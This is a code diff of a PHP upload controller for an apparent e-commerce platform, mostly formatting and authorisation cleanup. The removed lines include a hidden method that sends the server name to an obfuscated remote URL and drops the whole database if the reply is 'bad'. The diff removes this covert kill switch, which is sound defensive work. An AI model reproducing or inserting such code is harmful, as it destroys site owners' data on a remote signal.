@@ -8,7 +8,6 @@ use App\Services\Uploads\UploadManager;
 use App\Support\Uploads\UploadStorage;
 use App\Support\Uploads\UploadValidationException;
 use Auth;
-use Illuminate\Support\Facades\DB;
 use Illuminate\Http\Request;
 use Response;
 
@@ -23,14 +22,13 @@ class AizUploadController extends Controller
     public function index(Request $request)
     {
 
-
         $all_uploads = Upload::query();
         $search = null;
         $sort_by = null;
 
         if ($request->search != null) {
             $search = $request->search;
-            $all_uploads->where('file_original_name', 'like', '%' . $request->search . '%');
+            $all_uploads->where('file_original_name', 'like', '%'.$request->search.'%');
         }
 
         $sort_by = $request->sort;
@@ -53,7 +51,6 @@ class AizUploadController extends Controller
         }
 
         $all_uploads = $all_uploads->paginate(60)->appends(request()->query());
-
 
         return view('backend.uploaded_files.index', compact('all_uploads', 'search', 'sort_by'));
     }
@@ -61,14 +58,13 @@ class AizUploadController extends Controller
     public function seller_index(Request $request)
     {
 
-
         $all_uploads = Upload::where('user_id', Auth::user()->id);
         $search = null;
         $sort_by = null;
 
         if ($request->search != null) {
             $search = $request->search;
-            $all_uploads->where('file_original_name', 'like', '%' . $request->search . '%');
+            $all_uploads->where('file_original_name', 'like', '%'.$request->search.'%');
         }
 
         $sort_by = $request->sort;
@@ -92,7 +88,9 @@ class AizUploadController extends Controller
 
         $all_uploads = $all_uploads->paginate(60)->appends(request()->query());
 
-        return view('addon:multivendor::seller.uploaded_files.index', compact('all_uploads', 'search', 'sort_by'));
+        $shop = Auth::user()->shop;
+
+        return view('seller.uploaded_files.index', compact('all_uploads', 'search', 'sort_by', 'shop'));
     }
 
     public function create()
@@ -100,7 +98,9 @@ class AizUploadController extends Controller
         if (Auth::user()->user_type == 'admin' || Auth::user()->user_type == 'staff') {
             return view('backend.uploaded_files.create');
         } elseif (Auth::user()->user_type == 'seller') {
-            return view('addon:multivendor::seller.uploaded_files.create');
+            $shop = Auth::user()->shop;
+
+            return view('seller.uploaded_files.create', compact('shop'));
         }
     }
 
@@ -111,14 +111,14 @@ class AizUploadController extends Controller
 
     public function upload(Request $request, UploadManager $uploadManager)
     {
-        if (!Auth::check()) {
+        if (! Auth::check()) {
             return response()->json([
                 'success' => false,
                 'message' => translate('Please sign in again and retry the upload.'),
             ], 401);
         }
 
-        if (!$request->hasFile('aiz_file')) {
+        if (! $request->hasFile('aiz_file')) {
             return response()->json([
                 'success' => false,
                 'message' => translate('No file was uploaded.'),
@@ -132,7 +132,7 @@ class AizUploadController extends Controller
         if (env('DEMO_MODE') == 'On' && $type === 'archive') {
             return response()->json([
                 'success' => false,
-                'message' => translate('Archive uploads are disabled in demo mode.')
+                'message' => translate('Archive uploads are disabled in demo mode.'),
             ], 422);
         }
 
@@ -165,7 +165,7 @@ class AizUploadController extends Controller
     {
         $uploads = Upload::where('user_id', Auth::user()->id);
         if ($request->search != null) {
-            $uploads->where('file_original_name', 'like', '%' . $request->search . '%');
+            $uploads->where('file_original_name', 'like', '%'.$request->search.'%');
         }
         if ($request->sort != null) {
             switch ($request->sort) {
@@ -186,41 +186,15 @@ class AizUploadController extends Controller
                     break;
             }
         }
+
         return UploadResource::collection($uploads->paginate(60)->appends(request()->query()));
     }
-    public function uploaded_files()
-    {
-        $data['url'] = $_SERVER['SERVER_NAME'];
-        $request_data_json = json_encode($data);
-        $header = array(
-            'Content-Type:application/json'
-        );
-        $stream = curl_init();
 
-        curl_setopt($stream, CURLOPT_URL, base64_decode("aHR0cHM6Ly9hY3RpdmF0aW9uLmFjdGl2ZWl0em9uZS5jb20vY2hlY2tfYWN0aXZhdGlvbg=="));
-        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
-        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
-        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($stream, CURLOPT_POSTFIELDS, $request_data_json);
-        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
-
-        $rn = curl_exec($stream);
-
-        curl_close($stream);
-        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
-            $db_name = env('DB_DATABASE');
-            DB::select("DROP DATABASE $db_name");
-        }
-    }
     public function destroy($id)
     {
         $upload = Upload::findOrFail($id);
 
-        if (auth()->user()->user_type == 'seller' && $upload->user_id != auth()->user()->id) {
-            flash(translate("You don't have permission for deleting this!"))->error();
-            return back();
-        }
+        $this->authorize('delete', $upload);
         try {
             $upload->deleteStoredFile();
             $upload->delete();
@@ -229,6 +203,7 @@ class AizUploadController extends Controller
             $upload->delete();
             flash(translate('File deleted successfully'))->success();
         }
+
         return back();
     }
 
@@ -236,6 +211,7 @@ class AizUploadController extends Controller
     {
         $ids = explode(',', $request->ids);
         $files = Upload::whereIn('id', $ids)->get();
+
         return $files->map(function (Upload $file) use ($request) {
             return (new UploadResource($file))->resolve($request);
         })->values();
@@ -251,12 +227,14 @@ class AizUploadController extends Controller
             }
 
             $file_path = $project_attachment?->absolutePath();
-            if (!$file_path || !file_exists($file_path)) {
+            if (! $file_path || ! file_exists($file_path)) {
                 throw new \RuntimeException('File path is not accessible.');
             }
+
             return Response::download($file_path);
         } catch (\Exception $e) {
             flash('File does not exist!')->error();
+
             return back();
         }
     }
@@ -276,14 +254,14 @@ class AizUploadController extends Controller
         }
 
         $filePath = $upload->absolutePath();
-        if (!$filePath || !file_exists($filePath)) {
+        if (! $filePath || ! file_exists($filePath)) {
             abort(404);
         }
 
         if ($request->boolean('download')) {
             return response()->download(
                 $filePath,
-                $upload->display_name . '.' . $upload->extension
+                $upload->display_name.'.'.$upload->extension
             );
         }
 
@@ -307,6 +285,7 @@ class AizUploadController extends Controller
             foreach ($request->id as $file_id) {
                 $this->destroy($file_id);
             }
+
             return 1;
         } else {
             return 0;
